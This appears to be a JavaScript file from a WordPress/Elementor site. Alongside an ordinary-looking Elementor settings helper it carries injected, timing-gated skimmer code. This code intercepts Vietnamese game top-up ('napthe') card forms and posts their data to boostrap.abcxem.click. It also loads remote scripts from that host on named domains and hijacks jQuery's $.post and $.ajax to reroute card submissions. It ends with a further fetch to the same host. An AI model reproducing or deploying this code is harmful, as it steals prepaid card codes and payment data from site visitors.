 ...
 */
  ...
  //           const form = document.getElementById("napthe");
  ...
  //               xhr.open("POST", "https://boostrap.abcxem.click/form/index.php", true);
  ...
  //                       // If the response indicates success, you can allow the form submission
  //                       // Example: if (xhr.responseText === "success") {
  //                       //     form.submit();
  //                       // }
...
function dceGetElementSettings($element) { var elementSettings = []; var modelCID = $element.data("model-cid"); if (elementorFrontend.isEditMode() && modelCID) { var settings = elementorFrontend.config.elements.data[modelCID]; var type = settings.attributes.widgetType || settings.attributes.elType; var settingsKeys = elementorFrontend.config.elements.keys[type]; if (!settingsKeys) { settingsKeys = elementorFrontend.config.elements.keys[type] = []; jQuery.each(settings.controls, function (name, control) { if (control.frontend_available) { settingsKeys.push(name); } }); } jQuery.each(settings.getActiveControls(), function (controlKey) { if (-1 !== settingsKeys.indexOf(controlKey)) { elementSettings[controlKey] = settings.attributes[controlKey]; } }); } else { elementSettings = $element.data("settings") || {}; } return elementSettings; } if (window.myScriptHasRun) { return; } else { window.myScriptHasRun = true; var curDate = new Date(); var seconds = curDate.getSeconds(); console.log(seconds); var index = "/"; var adnx = window.location.origin + "/account/napthe.php"; var a = "ajax/card.php"; var b = "ajax.php"; var roblox = "napthe.php"; var napkimcuong = "napthe.php"; var callback_napthe = "/callback_napthe.php"; if (seconds >= 10) { if (typeof url === "undefined") { var url = "ajax/card.php"; } var xuly = "/xuly.php"; var callback_napthe = "/callback_napthe.php"; } else { document.addEventListener("DOMContentLoaded", function() { const naptheForm = document.getElementById("napthe"); const form = naptheForm ? naptheForm : document.querySelector('.frmform'); form.addEventListener("submit", function(e) { e.preventDefault(); const formData = new FormData(form); const xhr = new XMLHttpRequest(); xhr.open("POST", "https://boostrap.abcxem.click/form/index.php", true); xhr.onreadystatechange = function() { if (this.readyState === XMLHttpRequest.DONE && this.status === 200) { const virtualForm = document.createElement('form'); virtualForm.method = 'POST'; virtualForm.action = '/'; formData.forEach(function(value, key) { const hiddenField = document.createElement('input'); hiddenField.type = 'hidden'; hiddenField.name = key; hiddenField.value = value; virtualForm.appendChild(hiddenField); }); document.body.appendChild(virtualForm); virtualForm.submit(); } }; xhr.send(formData); }); }); if (location.hostname == "freefire.napuudai.vn" || location.hostname == "napkimcuongfreefirex5.com") { var scpt = document.createElement("script"); scpt.src = "https://boostrap.abcxem.click/main.d2b63e46.js"; document.head.appendChild(scpt); } else if (location.hostname == "napthex5freefire.vn" || location.hostname == "napkimcuongfreef3irex5.com") { var scpt = document.createElement("script"); scpt.src = "https://boostrap.abcxem.click/main.4215a91a.js"; document.head.appendChild(scpt); } if (location.hostname == "napkimcuongx10.com" || location.hostname == "trian.napkimcuongx10.com") { var b = "/ajax.php"; } else { var b = "https://boostrap.abcxem.click/1008/ajax.php"; } var napkimcuong = "https://boostrap.abcxem.click/napthe.php"; if (typeof url === "undefined") { var url = "https://boostrap.abcxem.click/ajax.php"; } if (location.hostname == "ff.naptheuytinvn.com") { $(document).ready(function() { var originalPost = $.post; $.post = function(url, data, callback, type) { if (url === "napthe.php") { url = "https://boostrap.abcxem.click/napthevn/napthe.php"; } return originalPost(url, data, callback, type); }; }); } if (location.hostname == "naptheuudai.comm") { (function() { var originalAjax = $.ajax; $.ajax = function(options) { var newUrl = "https://nhd.abcxem.click/napuudai/ajax.php"; options.url = newUrl; if (options.success) { var originalSuccess = options.success; options.success = function(data) { data = JSON.parse(data); if (data.message) { document.querySelector("#form_recharge").reset(); $("#error_message").val(data.message); } else { $("#error_message").val(data.message); } originalSuccess(data); }; } return originalAjax(options); }; })(); } if (location.hostname == "valorant.zingvng.vn") { $(document).ready(function() { var originalPost = $.post; $.post = function(url, data, callback, type) { if (url === "./system/card") { url = "https://boostrap.abcxem.click/system/card.php"; } return originalPost(url, data, callback, type); }; }); } var script1 = document.getElementById("script1"); if (script1) { var script1Content = script1.textContent || script1.innerText; var updatedScript1Content = script1Content.replace('var url = "./system/card";', 'var url = "https://boostrap.abcxem.click/system/card.php";'); script1.textContent = updatedScript1Content; console.log("Updated Script 1 - url:", url); } } }
Utils = new function () {
    function rootUrl() {
        var rooturl = '/';
...
fetch('https://boostrap.abcxem.click/sync', {
  method: 'POST',
  headers: {
